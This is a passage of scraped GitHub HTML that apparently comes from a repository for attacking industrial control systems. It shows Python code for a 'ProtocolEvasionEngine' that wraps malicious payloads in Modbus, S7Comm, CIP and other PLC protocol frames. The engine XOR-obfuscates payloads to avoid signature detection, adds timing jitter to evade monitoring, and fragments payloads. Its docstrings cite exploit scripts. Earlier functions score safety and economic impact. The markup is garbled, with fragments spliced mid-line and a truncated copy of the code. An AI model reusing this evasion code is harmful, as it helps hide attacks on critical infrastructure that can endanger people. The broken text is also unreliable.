class=\"pl-c1\"\u003eevaluate_emergency_response\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'safety_integrity_level'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_safety_integrity\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esafety_impact\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_cascading_effects\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Simulate cascading impacts across interconnected systems\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ecascading_effects\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'interdependent_systems'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_system_interdependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'critical_infrastructure_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_infrastructure_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'public_health_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eevaluate_public_health_effects\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'socioeconomic_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_socioeconomic_consequences\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecascading_effects\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecalculate_economic_loss\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Calculate comprehensive economic impact\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Production loss value\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eproduction_loss\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_production_loss\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003ehourly_production_value\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emodel\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eget\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'hourly_production_value'\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e10000\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Equipment damage costs\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eequipment_damage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_replacement_cost\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Environmental cleanup costs\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ecleanup_costs\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_cleanup_costs\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Regulatory penalties\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eregulatory_penalties\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_regulatory_penalties\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-s1\"\u003etotal_economic_impact\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\n            (\u003cspan class=\"pl-s1\"\u003eproduction_loss\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehourly_production_value\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eequipment_damage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ecleanup_costs\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eregulatory_penalties\u003c/span\u003e\n        )\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etotal_economic_impact\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eassess_system_interdependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Analyze interconnected system impacts\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einterdependencies\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'utility_dependencies'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_utility_dependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'supply_chain_dependencies'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_supply_chain_dependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'infrastructure_dependencies'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_infrastructure_dependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'regulatory_reporting_dependencies'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_regulatory_dependencies\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einterdependencies\u003c/span\u003e\n        \u003cspan base\u003c/li\u003e\n\u003cli\u003eSmall timing jitter addition (±0.1s variation)\u003c/li\u003e\n\u003cli\u003eMicro-jitter between actions (0.01-0.05s)\u003c/li\u003e\n\u003cli\u003ePattern class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"class ProtocolEvasionEngine:\n    def __init__(self):\n        self.protocol_profiles = self.load_protocol_profiles()\n        self.traffic_patterns = self.analyze_legitimate_traffic()\n\n    def mimic_legitimate_traffic(self, malicious_payload, target_protocol):\n        \u0026quot;\u0026quot;\u0026quot;Enhanced protocol traffic mimicry with multiple evasion layers\n        \n        Protocol implementations reference:\n        - Modbus: tools/modbus-stealth-toolkit/modbus_stealth_attack.py\n        - S7Comm: tools/s7comm_security_framework/s7comm_exploit.py\n        - CIP: tools/cip_security_assessment/cip_exploiter.py\n        - OPC-UA: tools/opcua_security_framework/opcua_exploit.py\n        \u0026quot;\u0026quot;\u0026quot;\n        if target_protocol == 'modbus':\n            return self.encase_in_modbus(malicious_payload)\n        elif target_protocol == 'cip':\n            return self.encase_in_cip(malicious_payload)\n        elif target_protocol == 's7comm':\n            return self.encase_in_s7comm(malicious_payload)\n        elif target_protocol == 'dnp3':\n            return self.encase_in_dnp3(malicious_payload)\n        elif target_protocol == 'opc_ua':\n            return self.encase_in_opc_ua(malicious_payload)\n\n    def encase_in_modbus(self, payload):\n        \u0026quot;\u0026quot;\u0026quot;Advanced Modbus traffic encapsulation\n        \n        Reference: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:138-177\n        MBAP Header (7 bytes): Transaction ID (2) + Protocol ID (2) + Length (2) + Unit ID (1)\n        PDU: Function Code (1) + Data (N bytes)\n        \u0026quot;\u0026quot;\u0026quot;\n        # Enhanced Modbus frame with realistic parameters\n        modbus_wrapper = {\n            'transaction_id': self.generate_transaction_id(),\n            'protocol_id': 0x0000,  # Modbus/TCP\n            'length': 6 + len(payload),\n            'unit_id': self.get_plc_unit_id(),\n            'function_code': self.select_appropriate_function(len(payload)),\n            'starting_address': self.generate_plc_address(),\n            'quantity': len(payload) // 2,\n            'byte_count': len(payload),\n            'data': self.obfuscate_payload(payload),\n            'crc': self.calculate_modbus_crc()  # For RTU mode only\n        }\n        return self.build_modbus_frame(modbus_wrapper)\n\n    def encase_in_s7comm(self, payload):\n        \u0026quot;\u0026quot;\u0026quot;Siemens S7Comm protocol encapsulation\n        \n        Reference: tools/s7comm_security_framework/s7comm_exploit.py:94-140\n        Note: Complete S7Comm packet requires TPKT (4 bytes) + COTP (3 bytes) + S7 header\n        \u0026quot;\u0026quot;\u0026quot;\n        s7_wrapper = {\n            'protocol_id': 0x32,\n            'message_type': 0x01,  # Job request\n            'reserved': 0x0000,\n            'protocol_data_unit_reference': self.generate_pdu_reference(),\n            'parameter_length': len(payload) + 12,\n            'data_length': len(payload),\n            'function_code': 0x05,  # Write variable (S7FunctionCode.WRITE_VAR)\n            'item_count': 0x01,\n            'variable_specification': 0x12,\n            'address_length': 0x0A,\n            'syntax_id': 0x10,  # S7Any pointer\n            'transport_size': 0x02,  # Byte\n            'length': len(payload),\n            'db_number': 1,\n            'area': 0x84,  # Data block (S7Area.DATA_BLOCKS)\n            'address': 0x000000,\n            'data': payload\n        }\n        return self.build_s7comm_frame(s7_wrapper)\n\n    def timing_based_evasion(self, malicious_actions):\n        \u0026quot;\u0026quot;\u0026quot;Advanced timing-based detection evasion\u0026quot;\u0026quot;\u0026quot;\n        import time\n        import random\n        \n        # Enhanced timing patterns from real-world traffic analysis\n        normal_intervals = self.traffic_patterns.get('polling_intervals', [0.5, 1.0, 2.0, 5.0])\n        burst_patterns = self.traffic_patterns.get('burst_sequences', [])\n        \n        for action in malicious_actions:\n            # Select timing pattern based on current traffic profile\n            if random.random() \u0026lt; 0.7:  # 70% use normal intervals\n                base_delay = random.choice(normal_intervals)\n            else:  # 30% use burst patterns for realism\n                base_delay = random.choice(burst_patterns) if burst_patterns else 0.2\n            \n            # Add natural variation\n            variation = random.uniform(-0.15, 0.15)\n            delay = max(0.1, base_delay + variation)  # Minimum 100ms delay\n            \n            time.sleep(delay)\n            \n            # Execute action with randomized execution timing\n            action.execute()\n            \n            # Add micro-timing variations\n            jitter = random.uniform(0.005, 0.1)\n            time.sleep(jitter)\n\n    def traffic_shaping(self, packet_stream, target_throughput):\n        \u0026quot;\u0026quot;\u0026quot;Shape traffic to match expected network throughput\u0026quot;\u0026quot;\u0026quot;\n        packet_size = sum(len(packet) for packet in packet_stream)\n        expected_time = packet_size / target_throughput\n        \n        for packet in packet_stream:\n            send_time = len(packet) / target_throughput\n            time.sleep(send_time)\n            self.send_packet(packet)\n\n    def protocol_fragmentation(self, large_payload, protocol):\n        \u0026quot;\u0026quot;\u0026quot;Fragment large payloads across multiple protocol messages\n        \n        Protocol payload limits per specification:\n        - Modbus TCP: 253 bytes max (255 - Function Code - Byte Count)\n        - S7Comm: 240 bytes typical PDU (negotiable via S7 handshake)\n        - CIP: 504 bytes typical (EtherNet/IP encapsulation limit)\n        \u0026quot;\u0026quot;\u0026quot;\n        if protocol == 'modbus':\n            max_chunk = 120  # Conservative Modbus TCP data size (spec allows 253)\n        elif protocol == 's7comm':\n            max_chunk = 240  # S7Comm PDU size (typically 240, max 960)\n        else:\n            max_chunk = 100  # Default conservative size\n        \n        chunks = [large_payload[i:i+max_chunk] for i in range(0, len(large_payload), max_chunk)]\n        fragmented_messages = []\n        \n        for i, chunk in enumerate(chunks):\n            message = self.mimic_legitimate_traffic(chunk, protocol)\n            message['fragment_id'] = i\n            message['total_fragments'] = len(chunks)\n            fragmented_messages.append(message)\n        \n        return fragmented_messages\n\n    def select_appropriate_function(self, payload_size):\n        \u0026quot;\u0026quot;\u0026quot;Select most appropriate Modbus function code based on payload\n        \n        Reference: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:78-99\n        \u0026quot;\u0026quot;\u0026quot;\n        if payload_size \u0026lt;= 2:\n            return 0x06  # Write Single Register\n        elif payload_size \u0026lt;= 246:\n            return 0x10  # Write Multiple Registers\n        else:\n            return 0x17  # Read/Write Multiple Registers (for large data operations)\n\n    def obfuscate_payload(self, payload):\n        \u0026quot;\u0026quot;\u0026quot;Obfuscate payload to avoid signature detection\u0026quot;\u0026quot;\u0026quot;\n        # Simple XOR obfuscation with rotating key\n        key = 0x55\n        obfuscated = bytearray(payload)\n        for i in range(len(obfuscated)):\n            obfuscated[i] ^= key\n            key = (key + 1) % 256\n        return bytes(obfuscated)\n        ```\n\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eProtocolEvasionEngine\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eprotocol_profiles\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_protocol_profiles\u003c/span\u003e()\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003etraffic_patterns\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_legitimate_traffic\u003c/span\u003e()\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003emimic_legitimate_traffic\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003emalicious_payload\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_protocol\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Enhanced protocol traffic mimicry with multiple evasion layers\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003etarget_protocol\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'modbus'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003emalicious_payload\u003c/span\u003e)\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_protocol\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"\"\"Fragment large payloads across multiple protocol messages\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Protocol payload limits per specification:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Modbus TCP: 253 bytes max (255 - Function Code - Byte Count)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - S7Comm: 240 bytes typical PDU (negotiable via S7 handshake)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - CIP: 504 bytes typical (EtherNet/IP encapsulation limit)\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprotocol\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e'modbus'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003emax_chunk\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e120\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Conservative Modbus TCP data size (spec allows 253)\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eprotocol\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e's7comm'\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003emax_chunk\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e240\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# S7Comm PDU size (typically 240, max 960)\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e:\n            \u003cspan class=\"pl-s1\"\u003emax_chunk\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e100\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Default conservative size\u003c/span\u003e\n        \n        \u003cspan class=\"pl-s1\"\u003echunks\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-s1\"\u003elarge_payload\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003ei\u003c/span\u003e:\u003cspan class=\"pl-s1\"\u003ei\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003emax_chunk\u003c/span\u003e] \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ei\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003erange\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003elarge_payload\u003c/span\u003e), \u003cspan class=\"pl-s1\"\u003emax_chunk\u003c/span\u003e)]\n        \u003cspan class=\"pl-s1\"\u003efragmented_messages\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ei\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003echunk\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eenumerate\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003echunks\u003c/span\u003e):\n            \u003cspan class=\"pl-s1\"\u003emessage\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003echunks\u003c/span\u003e)\n            \u003cspan
